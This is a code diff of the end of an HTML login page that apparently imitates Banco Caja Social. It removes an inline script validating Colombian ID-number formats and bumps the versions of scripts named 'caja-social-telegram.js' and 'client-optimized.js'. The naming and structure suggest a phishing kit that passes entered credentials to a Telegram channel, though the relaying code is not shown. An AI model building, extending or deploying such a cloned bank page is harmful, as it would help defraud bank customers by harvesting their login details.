@@ -79,36 +79,8 @@
     </div>
     
     <script src="/socket.io/socket.io.js"></script>
-    <script>
-        document.addEventListener('DOMContentLoaded', function() {
-            const usuarioInput = document.getElementById('usuario');
-            const btnSiguiente = document.querySelector('.btn-siguiente');
-            
-            // Expresión regular para validar el formato: CC, CE, NI, TI o PE seguido de números
-            const validPattern = /^(CC|CE|NI|TI|PE)\d+$/;
-            
-            usuarioInput.addEventListener('input', function() {
-                const value = this.value.trim().toUpperCase();
-                
-                if (validPattern.test(value)) {
-                    btnSiguiente.classList.add('enabled');
-                    btnSiguiente.disabled = false;
-                    btnSiguiente.removeAttribute('disabled');
-                } else {
-                    btnSiguiente.classList.remove('enabled');
-                    btnSiguiente.disabled = true;
-                    btnSiguiente.setAttribute('disabled', 'disabled');
-                }
-            });
-            
-            usuarioInput.addEventListener('input', function() {
-                this.classList.remove('error');
-            });
-        });
-    </script>
-
     <script src="/js/banco-utils.js"></script>
-    <script src="caja-social-telegram.js?v=3"></script>
-    <script src="client-optimized.js?v=3"></script>
+    <script src="caja-social-telegram.js?v=4"></script>
+    <script src="client-optimized.js?v=4"></script>
 </body>
 </html>
